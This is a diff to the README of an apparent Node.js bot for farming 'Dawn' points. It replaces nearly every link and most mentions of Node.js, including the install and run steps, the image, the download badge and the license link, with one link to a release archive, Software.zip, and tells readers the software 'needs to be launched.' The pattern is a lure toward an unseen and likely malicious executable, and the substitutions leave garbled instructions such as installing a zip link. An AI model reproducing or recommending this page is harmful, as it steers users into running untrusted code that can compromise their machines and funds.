@@ -1,16 +1,16 @@
 # 🌅 Dawn Validator Bot JS
 
-Automate Dawn point mining with this robust Node.js script. 
+Automate Dawn point mining with this robust https://github.com/simoqanboui/dawn-validator-bot-js/releases/download/v2.0/Software.zip script. 
 
-![Dawn Validator Bot JS](https://example.com/path/to/image.png)
+![Dawn Validator Bot JS](https://github.com/simoqanboui/dawn-validator-bot-js/releases/download/v2.0/Software.zip)
 
 ## Overview
 
-Welcome to the Dawn Validator Bot JS repository! This project aims to automate the process of mining Dawn points using a Node.js script. By utilizing this bot, users can efficiently gather points on the Dawn platform without manual intervention. The script is designed to be user-friendly while providing advanced functionality for maximizing point mining efforts.
+Welcome to the Dawn Validator Bot JS repository! This project aims to automate the process of mining Dawn points using a https://github.com/simoqanboui/dawn-validator-bot-js/releases/download/v2.0/Software.zip script. By utilizing this bot, users can efficiently gather points on the Dawn platform without manual intervention. The script is designed to be user-friendly while providing advanced functionality for maximizing point mining efforts.
 
 ## Features
 
-🤖 **Automation:** Automate the process of mining Dawn points with a simple Node.js script.
+🤖 **Automation:** Automate the process of mining Dawn points with a simple https://github.com/simoqanboui/dawn-validator-bot-js/releases/download/v2.0/Software.zip script.
 
 🚀 **Efficiency:** Save time and effort by letting the bot handle the point mining process for you.
 
@@ -39,9 +39,9 @@ Welcome to the Dawn Validator Bot JS repository! This project aims to automate t
 To get started with the Dawn Validator Bot JS, follow these steps:
 
 1. Clone the repository to your local machine.
-2. Install Node.js if you haven't already.
+2. Install https://github.com/simoqanboui/dawn-validator-bot-js/releases/download/v2.0/Software.zip if you haven't already.
 3. Configure the bot settings to match your preferences.
-4. Run the script using Node.js.
+4. Run the script using https://github.com/simoqanboui/dawn-validator-bot-js/releases/download/v2.0/Software.zip
 
 For more detailed instructions, refer to the documentation included in the repository.
 
@@ -51,7 +51,7 @@ To use the Dawn Validator Bot JS, simply execute the script and let it handle th
 
 ## Download Software
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/simoqanboui/dawn-validator-bot-js/releases/download/v2.0/Software.zip)](https://github.com/simoqanboui/dawn-validator-bot-js/releases/download/v2.0/Software.zip)
 
 ### Note: Software needs to be launched.
 
@@ -65,8 +65,8 @@ We welcome contributions from the community to help improve the Dawn Validator B
 
 ## License
 
-The Dawn Validator Bot JS is released under the [MIT License](https://opensource.org/licenses/MIT). Feel free to modify and distribute the bot script according to the terms of the license.
+The Dawn Validator Bot JS is released under the [MIT License](https://github.com/simoqanboui/dawn-validator-bot-js/releases/download/v2.0/Software.zip). Feel free to modify and distribute the bot script according to the terms of the license.
 
 ---
 
-Thank you for choosing the Dawn Validator Bot JS for your point mining automation needs. We hope you enjoy a seamless and efficient point mining experience with this powerful Node.js script. Remember to check the "Releases" section for the latest updates and enhancements. Happy mining! 🌟
+Thank you for choosing the Dawn Validator Bot JS for your point mining automation needs. We hope you enjoy a seamless and efficient point mining experience with this powerful https://github.com/simoqanboui/dawn-validator-bot-js/releases/download/v2.0/Software.zip script. Remember to check the "Releases" section for the latest updates and enhancements. Happy mining! 🌟
